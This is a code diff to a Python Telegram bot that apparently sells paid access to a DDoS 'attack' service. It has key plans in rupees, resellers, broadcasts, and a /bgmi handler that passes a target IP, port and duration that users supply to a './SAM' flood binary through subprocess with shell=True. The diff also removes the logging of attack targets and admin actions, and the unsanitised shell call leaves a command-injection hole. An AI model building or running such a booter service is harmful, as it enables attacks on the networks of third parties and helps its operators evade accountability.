@@ -32,6 +32,7 @@ USER_ACCESS_FILE = "users_access.txt"
 KEYS_FILE        = "keys.txt"
 RESELLERS_FILE   = "resellers.txt"
 BALANCE_FILE     = "balances.txt"
+ALL_USERS_FILE   = "all_users.txt" # NEW: Tracks everyone who clicks /start
 
 ist = pytz.timezone('Asia/Kolkata')
 
@@ -50,6 +51,18 @@ KEY_PLANS = {
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  FILE HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def read_all_users() -> set:
+    try:
+        with open(ALL_USERS_FILE, "r") as f:
+            return {l.strip() for l in f if l.strip()}
+    except FileNotFoundError:
+        return set()
+
+def save_all_users(users: set):
+    with open(ALL_USERS_FILE, "w") as f:
+        for uid in users:
+            f.write(f"{uid}\n")
 
 def read_users() -> list:
     try:
@@ -135,7 +148,8 @@ def save_balances(balances: dict):
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  STATE & COOLDOWN
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-allowed_user_ids: list = read_users()
+all_known_users: set   = read_all_users() # Tracks everyone
+allowed_user_ids: list = read_users()     # Tracks paid users
 user_access: dict      = read_user_access()
 active_keys: dict      = read_keys()
 RESELLER_IDS: set      = read_resellers()
@@ -164,7 +178,6 @@ def is_admin_or_reseller(uid: str) -> bool:
 def get_balance(uid: str) -> int:
     return balances.get(uid, 0)
 
-# FIXED: Removed bot.get_chat() to prevent Telegram API crashes
 def log_action(user_id: str, action: str, message=None):
     if message and message.from_user.username:
         username = f"@{message.from_user.username}"
@@ -174,12 +187,6 @@ def log_action(user_id: str, action: str, message=None):
     now = datetime.datetime.now(ist).strftime("%d-%m-%Y %H:%M:%S")
     with open(LOG_FILE, "a") as f:
         f.write(f"[{now}] {username} | {action}\n")
-
-def clear_logs() -> str:
-    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
-        return "No logs to clear."
-    open(LOG_FILE, "w").close()
-    return "✅  Logs cleared."
 
 def no_access_msg() -> str:
     return (
@@ -202,19 +209,11 @@ def admin_reseller_only_msg() -> str:
 
 def remove_expired_users():
     current_time = time.time()
-    expired = [uid for uid, info in user_access.items()
-               if info["expiry_time"] <= current_time]
+    expired = [uid for uid, info in user_access.items() if info["expiry_time"] <= current_time]
 
     for uid in expired:
         try:
-            bot.send_message(uid,
-                "╔══════════════════════╗\n"
-                "║   ⏰  PLAN EXPIRED    ║\n"
-                "╚══════════════════════╝\n\n"
-                "Your access plan has ended.\n\n"
-                "🔑  Use /redeem <key> with a new key\n"
-                "    to reactivate your access."
-            )
+            bot.send_message(uid, "⏰ Your access plan has ended. Use /redeem with a new key to reactivate.")
         except Exception:
             pass
         user_access.pop(uid, None)
@@ -233,6 +232,12 @@ def remove_expired_users():
 
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
+    user_id = str(message.chat.id)
+    # Save user to global list if new
+    if user_id not in all_known_users:
+        all_known_users.add(user_id)
+        save_all_users(all_known_users)
+
     response = (
         "🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁</b> 🚀\n\n"
         "👑 <b>𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁</b>\n\n"
@@ -266,150 +271,47 @@ def show_help(message):
         "  /balance  → Check balance\n\n"
         "  🛠 ADMIN ONLY\n"
         "  /admincmd → View admin panel\n"
-        "  /add      → Add user directly\n"
-        "  /remove   → Remove a user\n"
-        "  /allusers → List all users\n"
-        "  /addreseller → Add a reseller\n"
-        "  /rmreseller  → Remove reseller\n"
-        "  /resellers   → List resellers\n"
-        "  /addbalance  → Add funds\n"
-        "  /setbalance  → Set funds\n"
-        "  /broadcast   → Send msg to all\n"
-        "  /logs         → Get log file\n"
-        "  /clearlogs   → Clear log file\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
 
 @bot.message_handler(commands=['status'])
 def bot_status(message):
     now = datetime.datetime.now(ist).strftime('%d %b %Y • %I:%M %p')
-    bot.reply_to(message,
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"      🟢  BOT STATUS\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"  Status   →  Online ✅\n"
-        f"  Uptime   →  24 × 7\n"
-        f"  Time     →  {now}\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━"
-    )
+    bot.reply_to(message, f"🟢 BOT STATUS\nStatus: Online ✅\nUptime: 24×7\nTime: {now}")
 
 @bot.message_handler(commands=['rules'])
 def show_rules(message):
-    bot.reply_to(message,
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "        📜  RULES\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "  1.  Do not share your key.\n"
-        "  2.  One key = one account.\n"
-        "  3.  Keys are non-refundable.\n"
-        "  4.  Use /plan to check expiry.\n"
-        "  5.  Violations may result in ban.\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━━"
-    )
+    bot.reply_to(message, "📜 RULES\n1. Do not share your key.\n2. One key = one account.\n3. Keys are non-refundable.\n4. Violations may result in ban.")
 
 @bot.message_handler(commands=['prices'])
 def show_prices(message):
     user_id = str(message.chat.id)
     if not is_admin_or_reseller(user_id):
-        bot.reply_to(message, admin_reseller_only_msg())
-        return
+        return bot.reply_to(message, admin_reseller_only_msg())
 
-    lines = [
-        "━━━━━━━━━━━━━━━━━━━━━━",
-        "    💰  KEY PRICE LIST",
-        "━━━━━━━━━━━━━━━━━━━━━━",
-        "",
-        "  Plan      Duration    Price",
-        "  ──────────────────────────",
-    ]
-    plan_display = {
-        "12hr":  "12 Hours ",
-        "1day":  "1 Day    ",
-        "3day":  "3 Days   ",
-        "7day":  "7 Days   ",
-        "30day": "30 Days  ",
-        "60day": "60 Days  ",
-    }
+    lines = ["💰 KEY PRICE LIST\n"]
     for plan, info in KEY_PLANS.items():
-        label = plan_display.get(plan, plan.ljust(9))
-        cost  = info["cost"]
-        lines.append(f"  {plan.ljust(8)}  {label}  ₹{cost}")
-    lines += [
-        "",
-        "  Use /genkey <plan> to generate",
-        "",
-        "━━━━━━━━━━━━━━━━━━━━━━"
-    ]
+        lines.append(f"  {plan.ljust(8)} - ₹{info['cost']}")
+    lines.append("\nUse /genkey <plan> to generate")
     bot.reply_to(message, "\n".join(lines))
 
 @bot.message_handler(commands=['id'])
 def show_user_info(message):
     user_id  = str(message.chat.id)
-    username = f"@{message.from_user.username}" if message.from_user.username else "—"
-    role     = "Admin" if is_admin(user_id) else ("Reseller" if is_reseller(user_id) else "User")
-
-    if user_id in user_access:
-        expiry_line = f"  Expiry  →  {fmt_expiry(user_access[user_id]['expiry_time'])}"
-    else:
-        expiry_line = "  Expiry  →  No active plan"
-
-    bal_line = ""
-    if is_reseller(user_id):
-        bal_line = f"\n  Balance →  ₹{get_balance(user_id)}"
-
-    bot.reply_to(message,
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"    👤  ACCOUNT INFO\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"  ID        →  {user_id}\n"
-        f"  Username →  {username}\n"
-        f"  Role      →  {role}\n"
-        f"{expiry_line}"
-        f"{bal_line}\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━"
-    )
+    role = "Admin" if is_admin(user_id) else ("Reseller" if is_reseller(user_id) else "User")
+    expiry_line = f"Expiry → {fmt_expiry(user_access[user_id]['expiry_time'])}" if user_id in user_access else "Expiry → No active plan"
+    bal_line = f"\nBalance → ₹{get_balance(user_id)}" if is_reseller(user_id) else ""
+    bot.reply_to(message, f"👤 ACCOUNT INFO\nID → {user_id}\nRole → {role}\n{expiry_line}{bal_line}")
 
 @bot.message_handler(commands=['myplan', 'plan'])
 def show_plan(message):
     user_id = str(message.chat.id)
     if user_id not in allowed_user_ids:
-        bot.reply_to(message, no_access_msg())
-        return
+        return bot.reply_to(message, no_access_msg())
     if user_id in user_access:
-        expiry = fmt_expiry(user_access[user_id]['expiry_time'])
-        bot.reply_to(message,
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"      📅  YOUR PLAN\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"  Status   →  Active ✅\n"
-            f"  Expires  →  {expiry}\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━"
-        )
+        bot.reply_to(message, f"📅 YOUR PLAN\nStatus → Active ✅\nExpires → {fmt_expiry(user_access[user_id]['expiry_time'])}")
     else:
-        bot.reply_to(message, "⚠️  No expiry info found.")
-
-@bot.message_handler(commands=['mylogs'])
-def show_my_logs(message):
-    user_id = str(message.chat.id)
-    if user_id not in allowed_user_ids:
-        bot.reply_to(message, no_access_msg())
-        return
-    try:
-        with open(LOG_FILE, "r") as f:
-            lines = f.readlines()
-        user_logs = [l for l in lines if f"ID:{user_id}" in l or (message.from_user.username and f"@{message.from_user.username}" in l)]
-        if user_logs:
-            bot.reply_to(message,
-                "━━━━━━━━━━━━━━━━━━━━━━\n"
-                "    📋  YOUR ACTIVITY\n"
-                "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-                "".join(user_logs[-20:]) +
-                "\n━━━━━━━━━━━━━━━━━━━━━━"
-            )
-        else:
-            bot.reply_to(message, "No activity found for your account.")
-    except FileNotFoundError:
-        bot.reply_to(message, "No logs found.")
+        bot.reply_to(message, "⚠️ No expiry info found.")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  KEY SYSTEM
@@ -418,31 +320,28 @@ def show_my_logs(message):
 @bot.message_handler(commands=['redeem'])
 def redeem_key(message):
     user_id = str(message.chat.id)
-    parts   = message.text.split()
+    
+    # Save to known users just in case
+    if user_id not in all_known_users:
+        all_known_users.add(user_id)
+        save_all_users(all_known_users)
 
-    if len(parts) < 2:
-        bot.reply_to(message, "Usage: /redeem <key>")
-        return
+    parts = message.text.split()
+    if len(parts) < 2: return bot.reply_to(message, "Usage: /redeem <key>")
 
     key = parts[1].strip().upper()
-
-    if key not in active_keys:
-        bot.reply_to(message, "❌ INVALID KEY. It is either wrong or already used.")
-        return
+    if key not in active_keys: return bot.reply_to(message, "❌ INVALID KEY. It is either wrong or already used.")
 
     plan_label = active_keys[key]
     plan_info  = KEY_PLANS.get(plan_label)
-    if not plan_info:
-        bot.reply_to(message, "❌  Unknown plan on this key. Contact admin.")
-        return
+    if not plan_info: return bot.reply_to(message, "❌ Unknown plan on this key. Contact admin.")
 
-    now       = datetime.datetime.now(ist)
+    now = datetime.datetime.now(ist)
     expiry_ts = (now + plan_info["duration"]).timestamp()
 
     if user_id not in allowed_user_ids:
         allowed_user_ids.append(user_id)
-        with open(USER_FILE, "a") as f:
-            f.write(f"{user_id}\n")
+        with open(USER_FILE, "a") as f: f.write(f"{user_id}\n")
 
     user_access[user_id] = {"expiry_time": expiry_ts}
     save_user_access(user_access)
@@ -451,40 +350,24 @@ def redeem_key(message):
     save_keys(active_keys)
 
     log_action(user_id, f"Redeemed key | plan={plan_label}", message)
-
-    bot.reply_to(message,
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"    ✅  KEY ACTIVATED\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"  Plan      →  {plan_label}\n"
-        f"  Expires  →  {fmt_expiry(expiry_ts)}\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━"
-    )
+    bot.reply_to(message, f"✅ KEY ACTIVATED\nPlan → {plan_label}\nExpires → {fmt_expiry(expiry_ts)}")
 
 @bot.message_handler(commands=['genkey'])
 def gen_key(message):
     user_id = str(message.chat.id)
-    if not is_admin_or_reseller(user_id):
-        bot.reply_to(message, admin_reseller_only_msg())
-        return
+    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg())
 
     parts = message.text.split()
     if len(parts) < 2 or parts[1] not in KEY_PLANS:
-        bot.reply_to(message,
-            f"Usage: /genkey <plan>\n"
-            f"Plans: {', '.join(KEY_PLANS.keys())}"
-        )
-        return
+        return bot.reply_to(message, f"Usage: /genkey <plan>\nPlans: {', '.join(KEY_PLANS.keys())}")
 
-    plan      = parts[1]
-    plan_info = KEY_PLANS[plan]
-    cost      = plan_info["cost"]
+    plan = parts[1]
+    cost = KEY_PLANS[plan]["cost"]
 
     if is_reseller(user_id) and not is_admin(user_id):
         current_bal = get_balance(user_id)
         if current_bal < cost:
-            bot.reply_to(message, f"❌ INSUFFICIENT BALANCE.\nNeeded: ₹{cost}\nBalance: ₹{current_bal}")
-            return
+            return bot.reply_to(message, f"❌ INSUFFICIENT BALANCE.\nNeeded: ₹{cost}\nBalance: ₹{current_bal}")
         balances[user_id] = current_bal - cost
         save_balances(balances)
 
@@ -493,52 +376,32 @@ def gen_key(message):
     save_keys(active_keys)
     log_action(user_id, f"Generated key | plan={plan} | cost=₹{cost}", message)
 
-    bot.reply_to(message,
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"    🔑  KEY GENERATED\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"  Key      →  <code>{key}</code>\n"
-        f"  Plan     →  {plan}\n\n"
-        f"  Tap to copy the key above.\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━",
-        parse_mode="HTML"
-    )
+    bot.reply_to(message, f"🔑 KEY GENERATED\nKey → <code>{key}</code>\nPlan → {plan}\nTap to copy.", parse_mode="HTML")
 
 @bot.message_handler(commands=['listkeys'])
 def list_keys(message):
     user_id = str(message.chat.id)
-    if not is_admin_or_reseller(user_id):
-        bot.reply_to(message, admin_reseller_only_msg())
-        return
-    if not active_keys:
-        bot.reply_to(message, "No unused keys available.")
-        return
+    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg())
+    if not active_keys: return bot.reply_to(message, "No unused keys available.")
     
-    lines = ["━━━━━━━━━━━━━━━━━━━━━━", "    🔑  UNUSED KEYS", "━━━━━━━━━━━━━━━━━━━━━━", ""]
-    for k, plan in active_keys.items():
-        lines.append(f"  {k}  [{plan}]")
-        
-    response_text = "\n".join(lines)
-    if len(response_text) > 4000: response_text = response_text[:4000] + "\n... (Truncated)"
-    bot.reply_to(message, response_text)
+    lines = ["🔑 UNUSED KEYS\n"]
+    for k, plan in active_keys.items(): lines.append(f"  {k}  [{plan}]")
+    bot.reply_to(message, "\n".join(lines)[:4000])
 
 @bot.message_handler(commands=['deletekey'])
 def delete_key(message):
     user_id = str(message.chat.id)
-    if not is_admin_or_reseller(user_id):
-        bot.reply_to(message, admin_reseller_only_msg())
-        return
+    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg())
     parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "Usage: /deletekey <key>")
-        return
+    if len(parts) < 2: return bot.reply_to(message, "Usage: /deletekey <key>")
+    
     key = parts[1].strip().upper()
     if key in active_keys:
         del active_keys[key]
         save_keys(active_keys)
-        bot.reply_to(message, f"✅  Key deleted.")
+        bot.reply_to(message, f"✅ Key deleted.")
     else:
-        bot.reply_to(message, "❌  Key not found.")
+        bot.reply_to(message, "❌ Key not found.")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  BALANCE SYSTEM
@@ -547,23 +410,19 @@ def delete_key(message):
 @bot.message_handler(commands=['addbalance'])
 def add_balance(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
+    
     parts = message.text.split()
-    if len(parts) < 3:
-        bot.reply_to(message, "Usage: /addbalance <userId> <amount>")
-        return
+    if len(parts) < 3: return bot.reply_to(message, "Usage: /addbalance <userId> <amount>")
 
     target = parts[1]
     try:
         amount = int(parts[2])
         if amount <= 0: raise ValueError
     except ValueError:
-        bot.reply_to(message, "❌ Amount must be a positive number.")
-        return
+        return bot.reply_to(message, "❌ Amount must be a positive number.")
 
-    if target not in RESELLER_IDS:
-        bot.reply_to(message, "❌ This user is not a reseller.")
-        return
+    if target not in RESELLER_IDS: return bot.reply_to(message, "❌ This user is not a reseller.")
 
     balances[target] = get_balance(target) + amount
     save_balances(balances)
@@ -573,19 +432,17 @@ def add_balance(message):
 @bot.message_handler(commands=['setbalance'])
 def set_balance(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
+    
     parts = message.text.split()
-    if len(parts) < 3:
-        bot.reply_to(message, "Usage: /setbalance <userId> <amount>")
-        return
+    if len(parts) < 3: return bot.reply_to(message, "Usage: /setbalance <userId> <amount>")
 
     target = parts[1]
     try:
         amount = int(parts[2])
         if amount < 0: raise ValueError
     except ValueError:
-        bot.reply_to(message, "❌ Amount must be 0 or more.")
-        return
+        return bot.reply_to(message, "❌ Amount must be 0 or more.")
 
     balances[target] = amount
     save_balances(balances)
@@ -596,29 +453,52 @@ def set_balance(message):
 def check_balance(message):
     user_id = str(message.chat.id)
     parts = message.text.split()
+    
     if is_admin(user_id) and len(parts) > 1:
         target = parts[1]
-        bot.reply_to(message, f"💰 Reseller {target} Balance: ₹{get_balance(target)}")
-        return
+        return bot.reply_to(message, f"💰 Reseller {target} Balance: ₹{get_balance(target)}")
 
-    if not is_reseller(user_id): return
-    bot.reply_to(message, f"💰 Your Balance: ₹{get_balance(user_id)}")
+    if is_reseller(user_id):
+        return bot.reply_to(message, f"💰 Your Reseller Balance: ₹{get_balance(user_id)}")
+        
+    bot.reply_to(message, "❌ You are not a reseller. Only resellers have balances.")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  ADMIN — User Management
+#  ADMIN & RESELLER MANAGEMENT
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+@bot.message_handler(commands=['admincmd'])
+def admin_commands(message):
+    user_id = str(message.chat.id)
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
+    bot.reply_to(message,
+        "🛠 ADMIN COMMANDS\n\n"
+        "👤 USER MANAGEMENT\n"
+        "/add <id> <plan>      Add user\n"
+        "/remove <id>          Remove user\n"
+        "/allusers             List users\n\n"
+        "🤝 RESELLER\n"
+        "/addreseller <id>     Add reseller\n"
+        "/rmreseller <id>      Remove reseller\n"
+        "/resellers            List resellers\n"
+        "/addbalance <id> <₹>  Add balance\n"
+        "/setbalance <id> <₹>  Set balance\n\n"
+        "📢 BROADCASTING\n"
+        "/broadcast <msg>      Send to EVERYONE\n"
+        "/bcpaid <msg>         Send to PAID users\n"
+        "/bcreseller <msg>     Send to RESELLERS\n"
+    )
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
     parts = message.text.split()
     if len(parts) < 3 or parts[2] not in KEY_PLANS:
-        bot.reply_to(message, f"Usage: /add <userId> <plan>\nPlans: {', '.join(KEY_PLANS.keys())}")
-        return
+        return bot.reply_to(message, f"Usage: /add <userId> <plan>\nPlans: {', '.join(KEY_PLANS.keys())}")
 
-    target    = parts[1]
-    plan      = parts[2]
+    target = parts[1]
+    plan = parts[2]
     expiry_ts = (datetime.datetime.now(ist) + KEY_PLANS[plan]["duration"]).timestamp()
 
     if target not in allowed_user_ids:
@@ -630,13 +510,19 @@ def add_user(message):
 
     user_access[target] = {"expiry_time": expiry_ts}
     save_user_access(user_access)
+    
+    # Save to global known list too
+    if target not in all_known_users:
+        all_known_users.add(target)
+        save_all_users(all_known_users)
+
     log_action(user_id, f"Added user={target} plan={plan}", message)
     bot.reply_to(message, f"{prefix}\nID: {target}\nExpires: {fmt_expiry(expiry_ts)}")
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
     parts = message.text.split()
     if len(parts) < 2: return bot.reply_to(message, "Usage: /remove <userId>")
     
@@ -646,7 +532,6 @@ def remove_user(message):
         user_access.pop(target, None)
         save_users(allowed_user_ids)
         save_user_access(user_access)
-        log_action(user_id, f"Removed user={target}", message)
         bot.reply_to(message, f"✅ User {target} removed.")
     else:
         bot.reply_to(message, "❌ User not found.")
@@ -654,27 +539,19 @@ def remove_user(message):
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
     if not allowed_user_ids: return bot.reply_to(message, "No authorized users.")
     
-    # FIXED: Removed get_chat() to prevent crash on large lists
-    lines = ["━━━━━━━━━━━━━━━━━━━━━━", "    👥  AUTHORIZED USERS", "━━━━━━━━━━━━━━━━━━━━━━", ""]
+    lines = ["👥 AUTHORIZED USERS\n"]
     for uid in allowed_user_ids:
-        expiry_info = f"  [{fmt_expiry(user_access[uid]['expiry_time'])}]" if uid in user_access else "  [No expiry]"
-        lines.append(f"  ID:{uid}{expiry_info}")
-        
-    response_text = "\n".join(lines)
-    if len(response_text) > 4000: response_text = response_text[:4000] + "\n... (Truncated)"
-    bot.reply_to(message, response_text)
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  ADMIN — Reseller Management
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        expiry_info = f" [{fmt_expiry(user_access[uid]['expiry_time'])}]" if uid in user_access else " [No expiry]"
+        lines.append(f"ID: {uid}{expiry_info}")
+    bot.reply_to(message, "\n".join(lines)[:4000])
 
 @bot.message_handler(commands=['addreseller'])
 def add_reseller(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
     parts = message.text.split()
     if len(parts) < 2: return bot.reply_to(message, "Usage: /addreseller <userId>")
     
@@ -684,14 +561,12 @@ def add_reseller(message):
     if target not in balances:
         balances[target] = 0
         save_balances(balances)
-        
-    log_action(user_id, f"Added reseller={target}", message)
     bot.reply_to(message, f"✅ Reseller {target} added with ₹0 balance.")
 
 @bot.message_handler(commands=['rmreseller'])
 def remove_reseller(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
     parts = message.text.split()
     if len(parts) < 2: return bot.reply_to(message, "Usage: /rmreseller <userId>")
     
@@ -699,78 +574,67 @@ def remove_reseller(message):
     if target in RESELLER_IDS:
         RESELLER_IDS.discard(target)
         save_resellers(RESELLER_IDS)
-        log_action(user_id, f"Removed reseller={target}", message)
         bot.reply_to(message, f"✅ Reseller {target} removed.")
 
 @bot.message_handler(commands=['resellers'])
 def list_resellers(message):
     user_id = str(message.chat.id)
-    if not is_admin(user_id): return
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
     if not RESELLER_IDS: return bot.reply_to(message, "No resellers found.")
     
-    # FIXED: Removed get_chat()
-    lines = ["━━━━━━━━━━━━━━━━━━━━━━", "      🤝  RESELLERS", "━━━━━━━━━━━━━━━━━━━━━━", ""]
-    for uid in RESELLER_IDS:
-        lines.append(f"  ID:{uid}  →  ₹{get_balance(uid)}")
-        
-    response_text = "\n".join(lines)
-    if len(response_text) > 4000: response_text = response_text[:4000] + "\n... (Truncated)"
-    bot.reply_to(message, response_text)
+    lines = ["🤝 RESELLERS\n"]
+    for uid in RESELLER_IDS: lines.append(f"ID: {uid} → ₹{get_balance(uid)}")
+    bot.reply_to(message, "\n".join(lines)[:4000])
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  ADMIN — Logs & Broadcast
+#  TARGETED BROADCASTING SYSTEM
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-@bot.message_handler(commands=['logs'])
-def send_logs(message):
-    user_id = str(message.chat.id)
-    if not is_admin(user_id): return
-    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-        with open(LOG_FILE, "rb") as f:
-            bot.send_document(message.chat.id, f)
-
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs_cmd(message):
-    user_id = str(message.chat.id)
-    if not is_admin(user_id): return
-    bot.reply_to(message, clear_logs())
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast_message(message):
-    user_id = str(message.chat.id)
-    if not is_admin(user_id): return
-
-    parts = message.text.split(maxsplit=1)
+def execute_broadcast(sender_message, target_list, prefix_msg):
+    parts = sender_message.text.split(maxsplit=1)
     if len(parts) < 2:
-        bot.reply_to(message, "Usage: /broadcast <message>")
-        return
+        return bot.reply_to(sender_message, f"Usage: {parts[0]} <message>")
 
-    text = f"━━━━━━━━━━━━━━━━━━━━━━\n      📢  𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n━━━━━━━━━━━━━━━━━━━━━━\n\n{parts[1]}\n\n━━━━━━━━━━━━━━━━━━━━━━"
-
-    all_targets = list(set(read_users()) | set(read_resellers()) | ADMIN_IDS)
+    text = f"📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n\n{parts[1]}"
     success, fail = 0, 0
-    for target in all_targets:
+    
+    # Send message to everyone in the list
+    for target in target_list:
         try:
             bot.send_message(target, text)
             success += 1
-            time.sleep(0.1) # Prevent Telegram flood limit
+            time.sleep(0.1) # Telegram anti-spam limit
         except Exception:
             fail += 1
 
-    bot.reply_to(message, f"📢 Broadcast Done\n✅ Sent: {success}\n❌ Failed: {fail}")
+    bot.reply_to(sender_message, f"📢 {prefix_msg} Done\n✅ Sent: {success}\n❌ Failed: {fail}")
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  ATTACK SYSTEM
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-# FIXED: Removed bot.get_chat()
-def log_command(message, target, port, time_val):
+@bot.message_handler(commands=['broadcast'])
+def broadcast_all(message):
     user_id = str(message.chat.id)
-    username = f"@{message.from_user.username}" if message.from_user.username else f"ID:{user_id}"
-    with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_val}\n\n")
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
+    
+    # Compile list of literally everyone the bot knows about
+    all_targets = list(all_known_users | set(allowed_user_ids) | RESELLER_IDS | ADMIN_IDS)
+    execute_broadcast(message, all_targets, "Broadcast to ALL USERS")
 
-# Background thread to prevent bot freeze
+@bot.message_handler(commands=['bcpaid'])
+def broadcast_paid(message):
+    user_id = str(message.chat.id)
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
+    execute_broadcast(message, allowed_user_ids, "Broadcast to PAID USERS")
+
+@bot.message_handler(commands=['bcreseller'])
+def broadcast_reseller(message):
+    user_id = str(message.chat.id)
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
+    execute_broadcast(message, list(RESELLER_IDS), "Broadcast to RESELLERS")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  ATTACK SYSTEM (Threaded)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
 def run_attack_background(chat_id, target, port, time_val):
     full_command = f"./SAM {target} {port} {time_val} 500"
     subprocess.run(full_command, shell=True)
@@ -781,16 +645,13 @@ def handle_bgmi(message):
     user_id = str(message.chat.id)
     
     if user_id not in allowed_user_ids:
-        bot.reply_to(message, no_access_msg())
-        return
+        return bot.reply_to(message, no_access_msg())
 
     if not is_admin(user_id):
         if user_id in bgmi_cooldown:
-            # FIXED: Accurate cooldown calculation
             time_passed = (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds()
             if time_passed < 60:
-                bot.reply_to(message, f"⏳ Cooldown! Wait {int(60 - time_passed)}s.")
-                return
+                return bot.reply_to(message, f"⏳ Cooldown! Wait {int(60 - time_passed)}s.")
 
     command = message.text.split()
     if len(command) == 4:
@@ -799,21 +660,16 @@ def handle_bgmi(message):
             port = int(command[2])
             time_val = int(command[3])
         except ValueError:
-            bot.reply_to(message, "❌ Port and Time must be numbers.")
-            return
+            return bot.reply_to(message, "❌ Port and Time must be numbers.")
 
         if time_val > 600:
-            bot.reply_to(message, "❌ Max time is 600s.")
-            return
+            return bot.reply_to(message, "❌ Max time is 600s.")
 
         bgmi_cooldown[user_id] = datetime.datetime.now()
-        
-        log_command(message, target, port, time_val)
         
         username = message.from_user.username if message.from_user.username else message.from_user.first_name
         bot.reply_to(message, f"{username}, 🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
         
-        # FIXED: Run attack in background so other users' commands don't freeze
         threading.Thread(target=run_attack_background, args=(message.chat.id, target, port, time_val)).start()
 
     else:
@@ -826,6 +682,6 @@ def handle_bgmi(message):
 if __name__ == "__main__":
     remove_expired_users()
     print("━━━━━━━━━━━━━━━━━━━━━━")
-    print("   ✅  Bot is running smoothly")
+    print("   ✅  Bot is running perfectly")
     print("━━━━━━━━━━━━━━━━━━━━━━")
     bot.infinity_polling(timeout=30, long_polling_timeout=20)
